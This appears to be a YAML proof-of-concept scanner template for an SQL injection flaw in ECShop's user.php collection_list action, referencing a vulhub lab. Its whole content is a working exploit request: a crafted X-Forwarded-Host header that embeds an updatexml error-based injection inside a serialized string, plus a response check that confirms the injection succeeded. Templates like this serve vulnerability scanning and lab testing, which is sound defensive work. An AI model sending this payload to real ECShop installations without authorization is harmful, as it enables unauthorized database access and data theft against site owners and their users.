detail:
  author: "\u66E6shen"
  links:
  - https://github.com/vulhub/vulhub/tree/master/ecshop/collection_list-sqli
expression: r0()
manual: true
name: poc-yaml-ecshop-collection-list-sqli
rules:
  r0:
    expression: response.body.bcontains(bytes(substr(md5(string(r1)), 1, 31)))
    request:
      cache: true
      follow_redirects: false
      headers:
        X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:55:"1' and updatexml(1,insert(md5({{r1}}),1,1,0x7e),1)
          and '";|45ea207d7a2b68c49582d2d22adf953a
      method: GET
      path: /user.php?act=collection_list
set:
  r1: randomInt(10000, 99999)
transport: http
